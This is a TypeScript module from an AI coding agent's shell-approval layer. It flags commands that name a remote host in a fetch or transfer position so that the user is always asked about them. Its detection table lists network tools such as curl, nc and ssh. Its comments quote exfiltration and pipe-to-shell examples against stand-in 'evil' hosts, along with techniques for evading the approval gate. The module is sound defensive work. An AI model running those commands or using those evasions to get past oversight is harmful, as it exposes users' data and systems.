/**
 * @module core/shell/openWorld
 *
 * EXT-61 (spec §4.6) — the **open-world preflight**: a deterministic, model-free check for a
 * **host literal in a fetch/transfer position**. A command that carries one is floored at
 * `destructive` before the rater is ever called ({@link import('./rater.js').mapVerdictToAction}),
 * so it is always asked about and can never be auto-approved.
 *
 * ## Why this is not a trust judgement, and must never become one
 *
 * §4.1.1(4) asks the rater to tell `registry.npmjs.org` from `registry.npmjs.ag`. **Both a cheap
 * model and a working developer were measured failing exactly that** — the developer flagged the
 * *genuine* registry as destructive, i.e. did not discriminate hostnames in either direction. This
 * preflight does not answer that question, it **deletes** it: both hostnames floor, both are asked
 * about, and no misreading of a hostname can produce an auto-approve.
 *
 * It therefore needs **no list of good hosts**, and that is precisely what makes it immune to the
 * attack it defends against — there is nothing to spoof into. If host trust is ever wanted it MUST
 * be a deterministic exact-match list in code (§4.1.1), never a model call. The user-facing escape
 * hatch already exists and is `approvals.allow` (§3), which is consulted *before* the rater and
 * therefore before this.
 *
 * ## THE ERROR COST IS INVERTED RELATIVE TO THE §8 HARDLINE — read this before editing
 *
 * The hardline **refuses**, unappealably, under every rung including `bypass`, so a false positive
 * there is unrecoverable and EXT-60 correctly narrowed its patterns until they were gone, accepting
 * misses. **This preflight only RAISES.** It floors at `destructive`, which means the user is
 * *asked*. So:
 *
 * - a **false positive costs one prompt** — annoying, recoverable, visible;
 * - an **evasion costs the whole point of the node**, because the rater then decides alone on a host
 *   literal, which is the discrimination both a cheap model and a working developer were measured
 *   failing.
 *
 * **So this layer errs toward OVER-matching.** That is the opposite of the hardline's calculus, and
 * it is why the shapes below prefer "any operand is a listed git subcommand" over enumerating git's
 * arg-taking global flags: an enumeration closes today's hole and reopens it for the next flag added
 * upstream. The one hard limit is unchanged and non-negotiable: **never fire on the mere presence of
 * a URL anywhere in the string**, because `git commit -m "closes https://…"` must stay silent.
 *
 * ## The shape of the matcher
 *
 * Ported from the measured prototype (`project-takahe _spikes/open-world-preflight/`).
 *
 * 1. **Decline on anything unclassifiable.** {@link classifyCommand} returns `null` on any
 *    composition (separator, line break, `$(…)`, backtick, redirection), and the *ambiguity*
 *    preflight already floors those. So this matcher never has to parse a hard command — and it
 *    must not claim the finding, because "it names a host" would be a worse (and possibly false)
 *    explanation than "its target cannot be statically resolved".
 * 2. **Step past wrappers** (`sudo -u root`, `env FOO=1`, `nohup --`, …) to the head.
 * 3. **Look the head up** in {@link NETWORK_HEADS}, keyed by *where a host may legitimately appear*.
 * 4. **Test only the candidate operands** for a host literal.
 *
 * **The head gate does nearly all of the work, and it is what keeps the false-positive rate at
 * zero.** A URL under a head that cannot reach the network is not a fetch, so `echo`, `grep`, `sed`
 * and — the case that would have sunk this design — `git commit -m "closes https://…"` all fall out
 * for free.
 *
 * **The project's own configured destinations are not host literals.** `git push origin main`,
 * `npm install lodash` and `ssh myserver` name no host — they resolve one from `.git/config`,
 * `.npmrc` and `~/.ssh/config` — so they stay `safe`, which is what keeps the corpus's
 * `routine-mutating` family unprompted.
 */

import { classifyCommand, tokenize } from '#src/core/shell/arity.js';
import { normalizeCommand } from '#src/core/shell/normalize.js';

/**
 * Wrapper binaries that delegate to the *next* command, so the head to test sits behind them.
 *
 * **The list is the hardline's; the BEHAVIOUR is deliberately looser, and the difference matters.**
 * `hardline.ts`'s prefix fragment is `(?:sudo\s+(?:-[^\s]+\s+)*)?` — it consumes sudo's flags but
 * not a flag's *operand*, which is right for a refusal layer where over-consuming would refuse more.
 * Here the cost runs the other way (see the module docblock), so once a wrapper has been seen this
 * matcher scans forward to the first token that is itself a network head — which absorbs `-u root`,
 * `-E`, `--preserve-env`, `-n`, `--` and any wrapper flag anyone adds later, without a table of
 * which wrapper flags take an argument. An earlier revision of this comment claimed parity with the
 * hardline; it did not hold, and `sudo -u root curl https://…` evaded the gate because of it.
 */
const WRAPPERS: ReadonlySet<string> = new Set([
  'sudo',
  'doas',
  'exec',
  'nohup',
  'setsid',
  'time',
  'env',
]);

/** A leading `VAR=value` assignment, which precedes the real head exactly like a wrapper does. */
const ENV_ASSIGNMENT_RE = /^[A-Za-z_][A-Za-z0-9_]*=/;

/**
 * Where a host may legitimately appear for a given head.
 *
 * - `all` — every positional operand is a candidate. These binaries exist to talk to a host.
 *   `bareHost` additionally admits a scheme-less `host.tld/path` or `host.tld:port` operand, and is
 *   set only on heads whose operands are endpoints rather than local files (see {@link BARE_HOST_RE}).
 * - `subcommand` — only when one of these subcommands is present (`git`: a URL where a remote name
 *   belongs).
 * - `flag` — the value of these flags (a registry / index override) **and** the positional operands,
 *   the latter tested for a URL scheme only (see {@link matchArgv}).
 */
type HostPosition =
  | { readonly kind: 'all'; readonly bareHost?: boolean }
  | { readonly kind: 'subcommand'; readonly subcommands: ReadonlySet<string> }
  | { readonly kind: 'flag'; readonly flags: ReadonlySet<string> };

/**
 * The network-capable heads, and where a host may appear under each.
 *
 * **This table is INCOMPLETE BY CONSTRUCTION and that is a design decision, not an oversight** —
 * `svn`, `hg`, `mvn`, `gradle`, `kubectl`, `docker`, `gh`, `deno`, `go`, `cargo`, `helm`, `brew` and
 * `terraform` all reach the network and are deliberately absent. Adding one is cheap and safe (a
 * miss becomes a prompt); what is *not* safe is widening a head's `HostPosition` so that an ordinary
 * LOCAL operand starts reading as a fetch target — that is the one edit that can put a filename in
 * front of the user as a "host". Weigh any addition against the must-NOT-fire probes in
 * `spec/shellOpenWorld.spec.ts`, not against the corpus — the corpus has almost no coverage of that
 * direction (see that spec's docblock).
 *
 * A `Map`, not an object literal, on purpose: the head comes from an attacker-influenceable command
 * string, and `NET['constructor']` on a plain object resolves through the prototype chain to
 * something that is not an entry of this table. The same hazard is documented at
 * {@link import('./rater.js').isBelowDestructiveFloor}.
 */
const NETWORK_HEADS: ReadonlyMap<string, HostPosition> = new Map<string, HostPosition>([
  // Fetchers / transfer agents whose operands are ENDPOINTS, not local files: a scheme-less
  // `example.com/install.sh` is a fetch here and nothing else.
  ['curl', { kind: 'all', bareHost: true }],
  ['wget', { kind: 'all', bareHost: true }],
  ['aria2c', { kind: 'all', bareHost: true }],
  ['http', { kind: 'all', bareHost: true }], // httpie
  ['httpie', { kind: 'all', bareHost: true }],
  ['xh', { kind: 'all', bareHost: true }],
  ['nc', { kind: 'all', bareHost: true }],
  ['ncat', { kind: 'all', bareHost: true }],
  ['netcat', { kind: 'all', bareHost: true }],
  ['telnet', { kind: 'all', bareHost: true }],
  ['ssh', { kind: 'all', bareHost: true }],
  ['sftp', { kind: 'all', bareHost: true }],
  ['ftp', { kind: 'all', bareHost: true }],
  // Transfer agents that take LOCAL paths beside remote ones — no bare-host rule, or `./my.dir/x`
  // would be offered to the user as a hostname.
  ['scp', { kind: 'all' }],
  ['rsync', { kind: 'all' }],
  // Cloud CLIs — a bucket/object URI is a host literal (`s3://…`, `gs://…`).
  ['aws', { kind: 'all' }],
  ['gsutil', { kind: 'all' }],
  ['az', { kind: 'all' }],
  // `git` only where a URL stands in for a configured remote. `git commit -m "…https://…"` and
  // `git tag -a v1 -m "see https://…"` are NOT fetches, and prompting on them would be a worse
  // annoyance regression than the one this preflight was built to avoid.
  [
    'git',
    {
      kind: 'subcommand',
      subcommands: new Set([
        'clone',
        'push',
        'pull',
        'fetch',
        'remote',
        'submodule',
        'ls-remote',
        'archive',
      ]),
    },
  ],
  // Package managers. The configured default registry in `.npmrc` is not a host literal, so
  // `npm install lodash` stays unprompted — but an `--registry`/`--index-url` override is, and so is
  // a URL in the install-target position (`npm install https://…/pkg.tgz` fetches remote code and
  // then runs its lifecycle scripts).
  ['npm', { kind: 'flag', flags: new Set(['--registry']) }],
  ['pnpm', { kind: 'flag', flags: new Set(['--registry']) }],
  ['yarn', { kind: 'flag', flags: new Set(['--registry']) }],
  ['npx', { kind: 'flag', flags: new Set(['--registry']) }],
  ['pip', { kind: 'flag', flags: new Set(['--index-url', '--extra-index-url', '-i']) }],
  ['pip3', { kind: 'flag', flags: new Set(['--index-url', '--extra-index-url', '-i']) }],
]);

/** `scheme://…` — `https`, `http`, `ftp`, `s3`, `gs`, `git+ssh`, anything. */
const SCHEME_RE = /^[a-z][a-z0-9+.-]*:\/\//i;
/** `user@host` (`deploy@myhost:/srv/`, `git@github.com:owner/repo.git`). */
const USER_AT_HOST_RE = /^[^@\s/]+@[a-z0-9._-]+(:|$)/i;
/** A bare IPv4 target, with or without a port or path. */
const IPV4_RE = /^(\d{1,3}\.){3}\d{1,3}(:|\/|$)/;
/**
 * scp/rsync `host.tld:path` with no scheme. The `(?!\/\/)` keeps it from re-matching a scheme.
 *
 * The final label must be **letters, two or more** — a real TLD never is anything else (RFC 3696;
 * an all-numeric final label is an address, and {@link IPV4_RE} owns that). Without that clause the
 * pattern read a dotted **git refspec** as a host: `git push origin v1.2.3:refs/tags/v1.2.3` floored,
 * which is routine release work and exactly the annoyance regression §4.6 is built to avoid.
 */
const HOST_COLON_PATH_RE = /^[a-z0-9-]+(\.[a-z0-9-]+)*\.[a-z]{2,}:(?!\/\/)/i;
/**
 * A scheme-less dotted host **followed by a path or a port** — `example.com/install.sh`,
 * `evil.example.net:8080/x`. Only offered to heads marked `bareHost`.
 *
 * The trailing `\/` or `:port` is what separates a hostname from a filename, and it is required for
 * exactly that reason: `file.tar.gz`, `urls.txt`, `package.json` and `batch.txt` are all
 * `label.label` with a letters-only final label, and admitting them would put a FILENAME in front of
 * the user as the counterparty — which defeats §4.6.1, whose entire premise is that the sentence
 * naming the host is the deliverable.
 *
 * The consequence, deliberate and documented: `ssh prod.example.com uptime` and
 * `nc evil.example.net 4444` are **misses**, because neither has a path or a port attached. A miss
 * costs a rating, which is what happened before this node existed.
 */
const BARE_HOST_RE = /^[a-z0-9-]+(\.[a-z0-9-]+)*\.[a-z]{2,}(:\d+)?\//i;

/**
 * Does this operand name a host — a URL scheme, a `user@host`, an IPv4 literal, or an scp-style
 * `host:path`? Deliberately syntactic: it asks *"is a counterparty named here"*, never *"is that
 * counterparty trustworthy"* (§4.1.1).
 */
export function isHostLiteral(operand: string): boolean {
  return (
    SCHEME_RE.test(operand) ||
    USER_AT_HOST_RE.test(operand) ||
    IPV4_RE.test(operand) ||
    HOST_COLON_PATH_RE.test(operand)
  );
}

/**
 * {@link isHostLiteral}, plus the scheme-less `host.tld/path` form. Applied only to operands of a
 * head marked `bareHost` — see {@link BARE_HOST_RE} for why it is not applied everywhere.
 */
function isHostLiteralOrBareHost(operand: string): boolean {
  return isHostLiteral(operand) || BARE_HOST_RE.test(operand);
}

/**
 * Reduce an argv[0] to the bare binary name: drop any path prefix, case-fold, drop a `.exe`.
 *
 * **The case fold is a real evasion fix, found by RUNNING the prototype rather than reading it.**
 * `cUrL https://…` passed the first version, because {@link normalizeCommand} deliberately
 * preserves case. That is irrelevant on Linux — but on **Windows and case-insensitive macOS
 * volumes that command resolves and runs**, and gaunt-sloth ships on both. A local Linux test run
 * cannot prove this cell; the CI matrix is what does.
 */
function bareHead(token: string): string {
  const lastSegment = token.split(/[\\/]/).pop() ?? '';
  return lastSegment.toLowerCase().replace(/\.exe$/, '');
}

/**
 * Find the index of the head to test: step over wrappers and `VAR=value` assignments, and — once a
 * wrapper has been consumed — scan forward to the first token that is itself a network head.
 *
 * **That forward scan is the fix for a one-token evasion**: the wrapper loop used to stop at the
 * first flag, so `sudo -u root curl https://evil/x` looked up the head `-u` (and then `root`), found
 * nothing, and declined — while the bare `sudo curl https://evil/x` floored. Every sudo flag
 * evaded, not just the arg-taking ones (`-E`, `-n`, `-H`, `--preserve-env`, `env -i`, `time -p`,
 * `nohup --`, `setsid -f`).
 *
 * Scanning for the head rather than enumerating wrapper flags is what makes it un-reopenable: it
 * needs no table of which wrapper flag takes an operand — the ambiguity that makes "skip the flag
 * and its operand" wrong (`sudo -E curl` would lose `curl` to `-E`'s imagined operand).
 *
 * It is bounded to the wrapper case on purpose. Applying it unconditionally would turn *any*
 * command mentioning a network binary into a fetch — `cp /usr/bin/curl /tmp/` must stay silent —
 * and the head gate is the thing keeping the false-positive rate at zero.
 */
function headIndex(argv: readonly string[]): number {
  let index = 0;
  let sawWrapper = false;
  while (index < argv.length) {
    if (WRAPPERS.has(bareHead(argv[index]))) {
      sawWrapper = true;
      index++;
      continue;
    }
    if (ENV_ASSIGNMENT_RE.test(argv[index])) {
      index++;
      continue;
    }
    break;
  }
  if (!sawWrapper || NETWORK_HEADS.has(bareHead(argv[index] ?? ''))) return index;
  const scanned = argv.findIndex(
    (token, position) => position >= index && NETWORK_HEADS.has(bareHead(token))
  );
  return scanned === -1 ? index : scanned;
}

/** One operand to test, with the host test that applies in the position it was found. */
interface Candidate {
  readonly value: string;
  readonly test: (operand: string) => boolean;
}

/**
 * Test ONE tokenized form of the command for host literals in a fetch position: find the head, gate
 * on it, then test only the operands where a host may legitimately appear.
 *
 * Kept separate from {@link findOpenWorldHostLiterals} because that function runs this over **two**
 * forms of the same command — see there for why.
 *
 * @returns every host literal found, in argv order. Empty when the command names no counterparty.
 */
function matchArgv(argv: readonly string[]): string[] {
  const index = headIndex(argv);
  const position = NETWORK_HEADS.get(bareHead(argv[index] ?? ''));
  if (position === undefined) return [];

  const operands = argv.slice(index + 1);
  const positional = operands.filter((operand) => !operand.startsWith('-'));
  const candidates: Candidate[] = [];

  switch (position.kind) {
    case 'all': {
      const test = position.bareHost ? isHostLiteralOrBareHost : isHostLiteral;
      candidates.push(...positional.map((value) => ({ value, test })));
      break;
    }
    case 'subcommand':
      // **ANY operand being a listed subcommand opens the gate**, rather than the first non-flag
      // one. `git -C . clone https://evil/x` put `.` in the subcommand position and turned the gate
      // off with one added token; enumerating git's arg-taking global flags (`-C`, `-c`,
      // `--git-dir`, `--work-tree`, `--namespace`, `--exec-path`, `--config-env`) would close that
      // and reopen it for the next flag added upstream. `tokenize` is quote-aware, so
      // `git commit -m "clone the repo, see https://…"` is the SINGLE operand
      // `clone the repo, see https://…`, which is not equal to `clone` — the gate stays shut.
      if (positional.some((operand) => position.subcommands.has(operand))) {
        candidates.push(...positional.map((value) => ({ value, test: isHostLiteral })));
      }
      break;
    case 'flag':
      for (let i = 0; i < operands.length; i++) {
        // Both spellings: `--registry=URL` and `--registry URL`.
        const [flag, inlineValue] = operands[i].split(/=(.*)/);
        if (position.flags.has(flag)) {
          candidates.push({ value: inlineValue ?? operands[i + 1] ?? '', test: isHostLiteral });
        }
      }
      // The install TARGET, tested for a URL scheme ONLY. `npm install https://evil/p.tgz` fetches
      // remote code and runs its lifecycle scripts, and was auto-approved because this arm looked at
      // flag values alone. The narrow test is deliberate: the full `isHostLiteral` would read
      // `npm install typescript@latest` and `npm install lodash@4.17.21` as `user@host` and prompt
      // on two of the most ordinary commands there are.
      candidates.push(
        ...positional.map((value) => ({
          value,
          test: (operand: string) => SCHEME_RE.test(operand),
        }))
      );
      break;
  }

  // De-duplicated, in first-seen order: a detached flag value (`--registry <URL>`) is also a
  // positional operand, so the same literal can be admitted by two arms and would otherwise be
  // named twice in the one sentence the user reads.
  return [
    ...new Set(
      candidates.filter((candidate) => candidate.test(candidate.value)).map(({ value }) => value)
    ),
  ];
}

/**
 * Find every **host literal in a fetch/transfer position**, or an empty array when the command names
 * no counterparty (spec §4.6).
 *
 * Takes the **raw** command, exactly like the other preflights: normalization happens inside, so a
 * caller can never accidentally hand this a form that has already lost the composition boundary
 * the decline below depends on.
 *
 * Returns `[]` — declining rather than flooring — for any command {@link classifyCommand} cannot
 * classify. Those compose, substitute or redirect, and the **ambiguity preflight already floors
 * them**, with a truer explanation than this one could give. Composed egress
 * (`curl … | sh`, `cat .env | curl …`) is thus still floored; it is simply floored one layer up.
 * That decline is also why `sed -i 's|http://a|http://b|' config.yml` is not this preflight's
 * finding: the `|` inside the sed expression reads as composition, so it was already unclassifiable
 * — and already escalating — before EXT-61 existed.
 *
 * **Every match is returned, not the first.** The first is not the target: for
 * `curl -x http://proxy.corp.local:3128 https://evil.example.net/x` it is the proxy, and for
 * `rsync -a backup.example.com:/srv/ deploy@evil.example.net:/tmp/` it is the source. §4.6.1's whole
 * premise is that the sentence naming the counterparty is what reaches the user, so a sentence that
 * names the reassuring one and hides the other defeats the point of the layer.
 *
 * ## Why both the normalized AND the raw argv are tested
 *
 * {@link normalizeCommand} collapses `\x` to `x`, which is correct on POSIX (it is what defeats
 * `c\url https://…`) and **destroys a Windows path separator**: `C:\Windows\System32\curl.exe`
 * normalizes to `C:WindowsSystem32curl.exe`, whose last path segment is no longer `curl`, so the
 * head gate misses it. That command runs on Windows, and gaunt-sloth ships there. Measured, not
 * reasoned — the POSIX form `/usr/bin/curl` was already handled, which is exactly what made the
 * Windows one easy to miss by reading.
 *
 * A second pass over the raw argv closes it. It is safe **because this layer can only RAISE**: a
 * second chance to match can add a prompt, never remove one, and the head gate is unchanged — an
 * argv[0] whose last path segment is literally `curl` or `wget` is a network binary under any
 * reading. The normalized pass still runs first and still owns the anti-obfuscation guarantees.
 *
 * @param command The raw command string as the model proposed it.
 * @returns The matched host literals, in argv order (used verbatim in the escalation reason).
 */
export function findOpenWorldHostLiterals(command: string): string[] {
  // (1) Unclassifiable → not ours. See the docblock: the ambiguity preflight owns these.
  if (classifyCommand(command, normalizeCommand) === null) return [];

  // The anti-obfuscation form first — `c\url`, `r''m`, fullwidth glyphs and ANSI escapes are all
  // folded away here.
  const normalizedArgv = tokenize(normalizeCommand(command));
  // `null` is unreachable in practice (classifyCommand already returns null on an unbalanced
  // quote); handled anyway so this function is total on its own terms rather than relying on a
  // neighbour's invariant.
  const normalizedHits = normalizedArgv === null ? [] : matchArgv(normalizedArgv);
  if (normalizedHits.length > 0) return normalizedHits;

  // …then the raw form, which is the only one that still has its Windows path separators.
  const rawArgv = tokenize(command);
  return rawArgv === null ? [] : matchArgv(rawArgv);
}
